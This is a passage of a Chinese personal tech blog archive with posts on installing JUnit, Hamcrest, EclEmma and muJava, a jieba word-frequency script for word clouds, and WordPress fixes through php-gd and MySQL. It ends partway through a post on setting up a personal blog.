<p>QQ 邮箱-邮我还有这样的一种链接：<a href="https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=wwq2021@foxmail.com">https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=wwq2021@foxmail.com</a></p>
<p>这种链接可读性好，而且还会保存登录状态。他的效果是这样的：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-3f5.png" alt=""></p>
<p>直接在输入框中写信，可随时发送。</p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="3260727180" class="record">
            <header>
                <h1 class="record-title">软件测试工具Junit、Hamcrest、Eclemma的安装</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Eclemma');">Eclemma</button>
                    
                    <button class="btn" onclick="activeTag('Eclipse');">Eclipse</button>
                    
                    <button class="btn" onclick="activeTag('Hamcrest');">Hamcrest</button>
                    
                    <button class="btn" onclick="activeTag('IDEA');">IDEA</button>
                    
                    <button class="btn" onclick="activeTag('Junit');">Junit</button>
                    
                    <button class="btn" onclick="activeTag('安装');">安装</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/14/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>在Eclipse、IDEA平台下，安装软件测试工具Junit、Hamcrest、Eclemma。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://typora-1301301520.cos.ap-nanjing.myqcloud.com/img/Junit.jpeg</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>c25abf8c</span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>IDEA Junit和Hamcrest的安装</h1>
<p>下载Junit和hamcrest的.jar包。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-3s7.png" alt=""></p>
<p>打开IntelliJ IDEA 2021.1.2 (Community Edition)，打开文件菜单下的Project Structure：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220314154252.png" alt=""></p>
<p>选择添加依赖：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220314154616.png" alt=""></p>
<p>选择需要添加的jar包。</p>
<blockquote>
<p>[!error] 图片失效<br>
此处原图片地址为<a href="http://60.205.223.216/wp-content/uploads/2022/03/QQ%E6%88%AA%E5%9B%BE20220314154509.png">http://60.205.223.216/wp-content/uploads/2022/03/QQ截图20220314154509.png</a></p>
</blockquote>
<p>点击“OK”确认即可。同理添加hamcrest。添加完成后，点击“应用”、“OK”即可。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220314154723.png" alt=""></p>
<h1>Eclipse中Junit、Hamcrest的安装</h1>
<p>右击项目文件夹，打开Properties。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2022-03-14-195204.png" alt=""></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220314195402.png" alt=""></p>
<p>按照图示添加.jar文件即可。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220314195704.png" alt=""></p>
<h1>Eclipse中Eclemma的安装</h1>
<p>Eclemma的安装方式，在插件官网上提供了三种：<a href="https://www.eclemma.org/installation.html">EclEmma - Installation</a>。现介绍线上安装方法和本地安装方法：</p>
<h2>通过Eclipse Marketplace进行安装</h2>
<p>打开Eclipse Marketplace：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2022-03-14-202523.png" alt=""></p>
<p>搜索插件并安装：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220314202635.png" alt=""></p>
<h2>使用手工的方式进行安装</h2>
<p>把下载好的压缩包解压至Eclipse安装目录下dropins文件夹中，效果如下：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-3d8.png" alt=""></p>
<p>文件结构如下：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imagre-39.png" alt=""></p>
<p>重启Eclipse，发现新增图标即说明安装成功。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-4asd0.png" alt=""></p>
<p>参考：</p>
<p><a href="https://blog.csdn.net/lee_x_lee/article/details/108024258">IDEA 导入Junit.jar 包 ，使用 Junit 单元测试过程_lee_x_lee的博客-CSDN博客_idea导入junit包</a></p>
<p><a href="https://blog.csdn.net/weixin_35676745/article/details/114105390">java junit安装_Eclipse中安装和配置使用Junit_大圣南佳境的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/lnpypy/article/details/52447097">Eclipse安装EclEmma插件_lnpypy的博客-CSDN博客</a></p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="3910313174" class="record">
            <header>
                <h1 class="record-title">免费高效制作精美词云（Python、wordart）</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Python');">Python</button>
                    
                    <button class="btn" onclick="activeTag('实现');">实现</button>
                    
                    <button class="btn" onclick="activeTag('词云');">词云</button>
                    
                    <button class="btn" onclick="activeTag('词频统计');">词频统计</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/17/2022</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://typora-1301301520.cos.ap-nanjing.myqcloud.com/img/wordcloud-cover.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>使用Python进行词频统计后，进入第三方网站导入统计数据生成词云。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>e912a4d6</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>现在网上制作词云的工具太多，但是存在一个问题，就是免费的词云网站制作得丑、不支持中文、没有词频统计，收费的又感觉没那必要。现提供以下简单的词频统计+词云制作的方法。</p>
<p>首先，用到免费的词云制作网站为<a href="http://wordart.com">wordart.com</a>，是个外国网站，需要导入词频统计数据。里面包含的词云调整功能丰富，可以自定义的地方很多，大家可以自己探索。</p>
<p>关于中文词频统计，则采用Python库进行。这里用到的是jieba第三方库，分词较准，灵活操作性强。脚本我已经编写好了，大家只需照做即可 。</p>
<p>[TOC]</p>
<h4>一、中文词频统计</h4>
<p>编写以下Python脚本：</p>
<pre><code class="language-python">import csv
import re
import jieba
import jieba.posseg as pseg

in_file_name = &quot;text.txt&quot;                   # 要分析的文本
user_dict_name = &quot;user_dict.txt&quot;            # 用户自定义词典
block_words_name = &quot;block_words.txt&quot;        # 屏蔽词
out_file_name = 'out.csv'                   # 词频统计数据的输出
block_word_class = [&quot;c&quot;,&quot;uj&quot;,&quot;p&quot;,&quot;r&quot;,&quot;ul&quot;]  # 屏蔽词性
regex = '^[\u4E00-\u9FA5A-Za-z0-9]+$'       # 除去标点符号，只保留中英文和数字

data = open(in_file_name, &quot;r&quot;, encoding='utf-8').read()     # 打开文件
jieba.load_userdict(user_dict_name)                         # 加载用户自定义词典
seg_list = pseg.cut(data,use_paddle=True)                   # 默认是精确模式
block_words_file = open(block_words_name,&quot;r&quot;,encoding=&quot;utf-8&quot;)  # 打开屏蔽词库
reader = csv.reader(block_words_file)
block_words = [w[0] for w in reader]                        # 生成屏蔽词列表
words = {}

# 统计
for str,flag in seg_list:
    # 屏蔽词、屏蔽词性
    if flag in block_word_class or str in block_words:
        continue
    if re.search(regex, str):
        try:
            words[str]
        except KeyError:
            words[str] = 0
        words[str] = words[str] + 1

# 写
out = open(out_file_name, 'w', newline=&quot;&quot;, encoding=&quot;utf-8&quot;)  # 注意，这里使用&quot;w&quot;不是&quot;wb&quot;，否则报错
writer = csv.writer(out,delimiter=&quot;\t&quot;)
for k, v in sorted(words.items(), key=lambda k: k[1], reverse=True):
    writer.writerow([k,v])
</code></pre>
<p>代码的第一段可根据自己的需求进行更改。现对这些参数进行解释。</p>
<h5>1. 需要分析的文本文件 in_file_name</h5>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220317163304.png" alt=""></p>
<p>在同目录下准备以下三个文件：需要分析的文本文件、用户自定义词典、屏蔽词库。将需要分析的文本文件名填入in_file_name中。</p>
<p>示例中，test.txt包含需要词频统计的内容。</p>
<h5>2. 用户自定义词典 user_dict_name</h5>
<p>此处脚本中，使用jieba默认的精确模式，会自动识别新词。但如果自己想添加自定义的词，可以在新的文本文件（utf-8）中按照以下方式进行添加：</p>
<pre><code>创新办 3 i
云计算 5
凱特琳 nz
台中
</code></pre>
<p>一个词占一行；每一行分三部分：词语、词频（可省略）、词性（可省略），用空格隔开，顺序不可颠倒。</p>
<p>词性表参见<a href="https://github.com/fxsjy/jieba">fxsjy/jieba: 结巴中文分词 (github.com)</a></p>
<p>比如：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220317163312.png" alt=""></p>
<p>关于jieba库的使用参见：<a href="https://github.com/fxsjy/jieba">fxsjy/jieba: 结巴中文分词 (github.com)</a></p>
<h5>3. 屏蔽词库 block_words_name</h5>
<p>新建一个文本文件，在里面添加不需要进行词频统计的词。一行一词。</p>
<p>比如：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220317163322.png" alt=""></p>
<h5>4. 输出的.csv文件名 out_file_name</h5>
<p>指定输出的.csv文件名。</p>
<h5>5.（可选）屏蔽词性block_word_class</h5>
<p>指定不需要进行词频统计的词的词性。词性列表参见下文。这里默认屏蔽连词、助词、介词、代词。</p>
<h5>6.（可选）保留词的正则表达式 regex</h5>
<p>指定需要进行词频统计的词的正则表达式。这里默认为中文、英文和数字。</p>
<p>当一切准备好后，运行脚本。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220317163500.png" alt=""></p>
<p>输出：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220317163340.png" alt=""></p>
<h4>二、WordArt网站设置</h4>
<p>运行以上脚本，复制输出的内容后。打开网站<a href="https://wordart.com/create">Word Art - Edit - WordArt.com</a>。</p>
<h5>1. 导入统计信息</h5>
<p>点击导入：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220317163024.png" alt=""></p>
<p>粘贴，并按照以下设置：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220317163052.png" alt=""></p>
<p>导入成功：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220317163100.png" alt=""></p>
<p>其他自定义操作可自行在网站上操作。</p>
<h5>2. 导入字体</h5>
<p>网站支持英文词云。如果想让中文词云也能生成，就必须上传一款中文字体。中文字体可以在系统字体（Fonts文件夹）中找：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E9%80%89%E6%8B%A9%E5%AD%97%E4%BD%93-1024x360.png" alt=""></p>
<p>导入字体后：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220317162823.png" alt=""></p>
<h5>3. 选择形状</h5>
<p>可以在网站图库中选。这里我采用自己上传的方式。注意，上传PNG图片更好。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220317162957-1024x753.png" alt=""></p>
<p>至于词云中其他自定义设定可以自行探索。</p>
<h5>4. 生成</h5>
<p>准备好了之后，点击生成按钮。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220317162704.png" alt=""></p>
<p>当当当当！生成成功。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/res.png" alt=""></p>
<h4>参考连接</h4>
<p>不同的词频统计第三方库：<a href="https://www.jianshu.com/p/7ad0cd33005e">Python中文分词及词频统计 - 简书 (jianshu.com)</a></p>
<p>csv库官方文档：<a href="https://docs.python.org/3/library/csv.html">csv — CSV File Reading and Writing — Python 3.10.2 documentation</a></p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="2466246546" class="record">
            <header>
                <h1 class="record-title">解决 WordPress「在裁剪您的图像时发生了错误」的问题</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, WordPress</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('CentOS');">CentOS</button>
                    
                    <button class="btn" onclick="activeTag('PHP');">PHP</button>
                    
                    <button class="btn" onclick="activeTag('php-gd');">php-gd</button>
                    
                    <button class="btn" onclick="activeTag('PNG');">PNG</button>
                    
                    <button class="btn" onclick="activeTag('问题解决');">问题解决</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/17/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>注意安装php-gd库后，检查你上传文件的大小。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/WPPIC.png</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>92ffef92</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>一开始出现“裁剪图像发生错误”这个问题，其实是因为没装 php-gd 库导致的。</p>
<p>在 CentOS 下运行：</p>
<pre><code class="language-shell">yum install php-gd
</code></pre>
<p>然后重启 Apache 即可。</p>
<p>但这解决了一部分问题而已。我试着上传 PNG 网站图标，还是出现“<strong>裁剪您的图像时发生了错误</strong>。”，但是 jpg 类型的又可以。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imagasde-42.png" alt=""></p>
<p>百思不得其解，后来才发现，注意图片大小就行了。。。。。最后我上传了 512*512 的 PNG 图片。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imagasde-41%20(1).png" alt=""></p>
<h1>本文参考</h1>
<ul>
<li><a href="https://blog.csdn.net/wbryfl/article/details/82750929">WordPress 提示&quot;在裁剪您的图像时发生了错误&quot;解决方案_wbryfl 的博客-CSDN 博客_wordpress 裁剪图像发生错误</a></li>
<li><a href="https://wordpress.stackexchange.com/questions/302291/there-has-been-an-error-cropping-your-image-when-cropping-image">&quot;There has been an error cropping your image&quot; when cropping image - WordPress Development Stack Exchange</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="3538365946" class="record">
            <header>
                <h1 class="record-title">旧页面-友链</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>Archive, undefined</span>
                </div>

                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/18/2022</span>
                </div>
                

                

                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>d2e72dfa</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/achived-cover.png</span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!Warning] 这是一篇归档文章<br>
本页面已停止更新，仅起历史归档作用。</p>
</blockquote>
<h1>想加uuanqin.top为友链</h1>
<p>欢迎各位大佬、爱好者添加uuanqin.top为友情链接！</p>
<p><strong>本网站地址为：<a href="http://uuanqin.top/">uuanqin.top</a></strong></p>
<p><strong>网站名称：半方池水半方田。</strong></p>
<p><strong>简介：一个技术分享及生活分享的个人博客网站。</strong></p>
<p>如果想要显示本网站logo，需遵循基本的视觉系统（详看文章尾）。</p>
<p>基本HTML框架：</p>
<pre><code class="language-html">&lt;a href=&quot;https://www.uuanqin.top&quot;&gt;&lt;img src=&quot;https://cdn.gallery.uuanqin.top/img/logo-bc.png&quot; alt=&quot;&quot;/&gt;&lt;/a&gt;
</code></pre>
<h1>想让自己的网站放在uuanqin.top“友情链接”栏中</h1>
<h2>下方发评论</h2>
<p>直接评论以下内容即可：</p>
<ul>
<li>网站名称</li>
<li>网址（最好是HTTPS哦）</li>
<li>图标地址（可选）</li>
<li>简介</li>
</ul>
<h2>其他方式</h2>
<p>通过右侧联系方式发送以下内容：</p>
<ul>
<li>主题。备注<strong>加友链</strong>。</li>
<li>网站链接、网站名称、网站主要内容（一两句话介绍）</li>
<li>站长</li>
<li>（可选）Logo及其图片代码</li>
<li>（可选）其他补充说明。网站详细介绍，模板添加等。</li>
</ul>
<p>很快我会回复并着手添加~期待你的来信~！</p>
<h1>附：本站视觉系统</h1>
<p>使用的图片链接即为下方的图片链接。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/logo-bc.png" alt="标准网站标识（彩），适合浅底背景"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/logo-dc.png" alt="彩色，适合深色背景"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/logo-dw.png" alt="单色（浅色），适合深色背景"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/A%E5%85%A8%E5%BD%A9%E6%97%A0%E5%AD%97.png" alt="单一标识，各种场景均可灵活使用"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/A%E5%85%A8%E7%99%BD%E6%97%A0%E5%AD%97.png" alt="其他款式（白）"></p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="713171771" class="record">
            <header>
                <h1 class="record-title">误操作 WordPress 站点地址的解决方案</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, WordPress</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('MySQL');">MySQL</button>
                    
                    <button class="btn" onclick="activeTag('搬运');">搬运</button>
                    
                    <button class="btn" onclick="activeTag('问题解决');">问题解决</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/18/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>登录MySQL修改WordPress设置即可。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/WPPIC.png</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>2a82233b</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>刚才不小心改了站点地址。改成uuanqin.top。因为没有备案，所有网站登不上去了。现找到解决方法留作备忘，同时加深WordPress与MySQL的理解。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-44-1024x167.png" alt=""></p>
<p>WordPress地址(URL)，不能随便更改！</p>
<p>在后台的设置里，WordPress地址（URL）是不能随便更改的，只有站点地址（URL）可以随意动。如果更改了WordPress地址（URL），主页面可能就丢失了。</p>
<h4>解决方案</h4>
<p>1、使用ssh登录服务</p>
<p>2、登录MySQL数据库</p>
<p>使用如下指令后，输入密码，打开mysql数据库：</p>
<pre><code class="language-sh">mysql -u root -p
</code></pre>
<p>3、选中wordpress的数据库</p>
<p>USE wordpress;（如果你没改名）</p>
<p>4、查看wp_contens表单</p>
<pre><code class="language-sql">select * from wp_options limit 1;
</code></pre>
<p>可以看到option_value这个属性值，如果WordPress地址（URL）修改错误，这个option_value就会变成那个错误的地址而无法再从后台更改，我们可以在数据库中对齐更改。</p>
<p>5、更改option_values</p>
<p>使用如下指令即可完成更改。your_wordpress_url为正确的WordPress地址（URL）。</p>
<pre><code class="language-sql">UPDATE wp_options SET option_value=&quot;your_wordpress_url&quot; WHERE option_name=&quot;siteurl&quot;;
</code></pre>
<p>更改完，就可以正常登陆主页了。</p>
<p>搬运：<a href="https://www.cnblogs.com/cfsxgogogo/p/11779327.html">误操作WordPress地址(URL)，主页丢失解决方案 - 菜风少侠 - 博客园 (cnblogs.com)</a></p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="4244887792" class="record">
            <header>
                <h1 class="record-title">mujava的安装与使用</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Eclipse');">Eclipse</button>
                    
                    <button class="btn" onclick="activeTag('Junit');">Junit</button>
                    
                    <button class="btn" onclick="activeTag('mujava');">mujava</button>
                    
                    <button class="btn" onclick="activeTag('安装');">安装</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/19/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>mujava的详细安装与使用方法，以及各种问题的解决。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://typora-1301301520.cos.ap-nanjing.myqcloud.com/img/mujava.png</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>fd03d8f0</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>mujava是一款用于变异测试的工具，官网上附有完整的安装和使用教程：<a href="https://cs.gmu.edu/~offutt/mujava/">muJava Home Page (gmu.edu)</a>。但在实际操作中，还是会遇到许多种问题。现将我实践过的安装教程详述如下。</p>
<h4>文件下载</h4>
<p>官网上下载这些东西：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-4as5.png" alt=""></p>
<p>实际上，mujava.config里面就一句话。自己复制过来在新建一个就行。</p>
<p>mujava.config里的默认内容：</p>
<pre><code>MuJava_HOME=C:\offutt\mujava
</code></pre>
<h4>目录准备</h4>
<p>这部分主要是动手环节（官网上就是动手.......）。在你想让mujava安装的地方，新建一个目录。比如：D:\mujava。</p>
<p>在D:\mujava里新建4个文件夹：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-asd46.png" alt=""></p>
<p>classes：存放编译好的Java源程序.class文件</p>
<p>result：mujava生成的结果文件（变异体）</p>
<p>src：待测的Java程序代码</p>
<p>testset：JUnit测试用例的.class文件</p>
<p>把mujava.config放到D:\mujava中。里边的内容改为：</p>
<pre><code>MuJava_HOME=D:\mujava
</code></pre>
<p>在D:\mujava中新建两个.txt文件，编写后续用到的命令。写好后改为.cmd文件。（注意，这里保证运行的mujava目录要包含mujava.config）</p>
<pre><code>GenMutants.cmd: java mujava.gui.GenMutantsMain
RunTest.cmd: java mujava.gui.RunTestMain &gt; TestResult.txt
</code></pre>
<p>把涉及到的包全部放进来（D:\mujava下）：JUnit、Hamcrest、mujava.java、openjava.java、tools.java。</p>
<p>JUnit、Hamcrest包另外在相应官网上下载；mujava.java、openjava.java是刚刚在mujava官网上下的；tools.jar在你配置的Java环境中自带的包（是Java的标准文件）。</p>
<p>比如我的tools.jar在这里（我的Java版本为1.8，据说Java版本过高可能导致失败）：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-4asd7.png" alt=""></p>
<p>关于这部分，官网是这样描述的：</p>
<blockquote>
<p><a href="https://cs.gmu.edu/~offutt/mujava/">muJava Home Page (gmu.edu)</a>:</p>
<p>The Java CLASSPATH must include two <strong><em>µJava</em></strong> jar files and one standard Java jar file. <strong>tools.jar</strong> is standard with Java (JDK) compilers and is probably located in the &quot;JavaHome/lib/&quot; directory. The two <strong><em>µJava</em></strong> files are <strong>mujava.jar</strong> and <strong>openjava.jar</strong>, which are downloaded from this site.</p>
</blockquote>
<p>上述引用中，所谓的_JavaHome_可以在环境变量里查询，一般你安装Java环境时都会配的。</p>
<p>这样，最终你的D:\mujava会是这样的：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-sa48.png" alt=""></p>
<h4>环境</h4>
<p>打开控制面板，搜索环境变量：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-49-1024x453.png" alt=""></p>
<p>编辑系统环境变量。如果没有CLASSPATH就新建一个：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imageas-50.png" alt=""></p>
<p>比如这样：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-51as.png" alt=""></p>
<h4>使用</h4>
<p>在src放入需要测试的Java源文件，<strong>注意包结构</strong>！</p>
<p>在classes放入待测试文件编译好的.class文件，<strong>注意包结构</strong>！</p>
<p>在testset放入JUnit测试文件编译好的.class文件，<strong>注意包结构</strong>！</p>
<p>双击运行GenMutants.cmd，出现以下GUI界面：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-52as.png" alt=""></p>
<p>运行结果：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-56-1024x473.png" alt=""></p>
<p>双击运行RunTest.cmd，弹出另外一个GUI界面。开始进行测试：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-5as3.png" alt=""></p>
<p>点击RUN即可运行。等待电脑风扇猛转后，结果就生成了。</p>
<p>（不知为什么，JUnit测试用例采用参数化的方式的话会报错。。。）</p>
<p>注意，小黑框里面会显示程序的运行状态，如果报错（比如找不到JUnit、Hamcrest包时）记得检查环境变量有没有配置好。</p>
<p>运行结果：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imageasd-57.png" alt=""></p>
<p>详细的测试结果可在TestResult.txt中查看。</p>
<h4>其他问题</h4>
<h5>目录结构问题</h5>
<p>关于目录结构问题，就是你在测试文件、被测试文件的包的关系，复制到mujava相应文件夹时要一致。否则会报错。下图是正确的例子：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-5asd4.png" alt=""></p>
<blockquote>
<p>[!error] 图片缺失<br>
此位置图片缺失，原图片地址为 <a href="http://60.205.223.216/wp-content/uploads/2022/03/image-55.png">http://60.205.223.216/wp-content/uploads/2022/03/image-55.png</a></p>
</blockquote>
<p>如果在运行测试用例杀死变异体过程中，出现诸如找不到类、空指针异常，可以试试重新运行命令多试几次。。</p>
<h5>检查Java版本</h5>
<blockquote>
<p>官网：Potential problems**: We have identified several potential problems with installing <em>µJava</em>.**</p>
<p>It is important that the MuJava_HOME variable <strong>NOT</strong> have a trailing slash. This will confuse <strong><em>µJava</em></strong>.<br>
If you have a different version of the java compiler and the JVM, <strong><em>µJava</em></strong> may get confused. This happens sometimes when a new application on your computer updates the JVM. If you have problems compiling or killing mutants, we suggest deleting all Java components and reinstalling the latest version.<br>
If your tools.jar file is out of date (pre Java 1.4, we think), parts of <strong><em>µJava</em></strong> may not work.</p>
</blockquote>
<h5>杀不死变异体</h5>
<p>有少数童鞋反映测试用例杀不死变异体，MS得分为0%。</p>
<p>在确认你的测试类编写对的情况下，请再次做这个检查：检查你的环境变量里，是不是把classes文件夹写了进去。请确保CLASSPATH里边<strong>没有</strong>D:/mujava/classes文件夹。</p>
<h4>参考链接</h4>
<p>mujava官网：<a href="https://cs.gmu.edu/~offutt/mujava/">muJava Home Page (gmu.edu)</a></p>
<p>安装和使用方法（中文）：<a href="https://blog.csdn.net/wkw1125/article/details/51967630">使用muJava进行变异测试_wkw1125的博客-CSDN博客_mujava</a></p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="2346883624" class="record">
            <header>
                <h1 class="record-title">成为一名个人博客网站站长</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined, 社会生活</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('ECS');">ECS</button>
                    
                    <button class="btn" onclick="activeTag('ICP');">ICP</button>
                    
                    <button class="btn" onclick="activeTag('LAMP');">LAMP</button>
                    
                    <button class="btn" onclick="activeTag('备案');">备案</button>
                    
                    <button class="btn" onclick="activeTag('实现');">实现</button>
                    
                    <button class="btn" onclick="activeTag('阿里云');">阿里云</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/21/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>个人博客网站建站的全流程以及要点提醒，以ECS阿里云服务器申请为例。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/pexels-pixabay-270700.jpg</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>8be29a28</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>今天 [^today] uuanqin.top 终于通过 ICP 备案了！现分享从 0 建站时我经历的步骤以及参考资料，为大家铺铺路。</p>
<p>[^today]: 2022 年 3 月 21 日。</p>
<blockquote>
<p>[!hint] 本文章关注于分享本网站建站所需最基本的事项，流程仅供参考。环境、软件、云服务商等服务的选择可自行决定。</p>
</blockquote>
<h1>基本准备</h1>
<ul>
<li>🏹 前置技能：Linux 基础，HTML 基础。</li>
<li>💰 资金：硬性年花费 100 左右。</li>
<li>📦 其他：满十八岁。身份证正反面照、手持身份证证件照。</li>
</ul>
<p>附表 [^tjfw]：服务器 [^fwq] 与域名 [^ym] 花费一览，以及额外对象存储与内容分发网络花费 [^txy]。</p>
<table>
<thead>
<tr>
<th>花费项目（元）</th>
<th>首年 2022</th>
<th>第 2 年 2023</th>
<th>第 3 年 2024</th>
</tr>
</thead>
<tbody>
<tr>
<td>服务器</td>
<td>87.12（n4）</td>
<td>87.12（n4）</td>
<td>99（e-c1m1）</td>
</tr>
<tr>
<td>服务器快照保存</td>
<td>0</td>
<td>9.48</td>
<td>统计中...</td>
</tr>
<tr>
<td>域名花费</td>
<td>1</td>
<td>29</td>
<td>29</td>
</tr>
<tr>
<td>【可选】对象存储</td>
<td>1.16</td>
<td>0.83</td>
<td>统计中...</td>
</tr>
<tr>
<td>【可选】CDN</td>
<td>3</td>
<td>22.37</td>
<td>统计中...</td>
</tr>
<tr>
<td><strong>总计</strong></td>
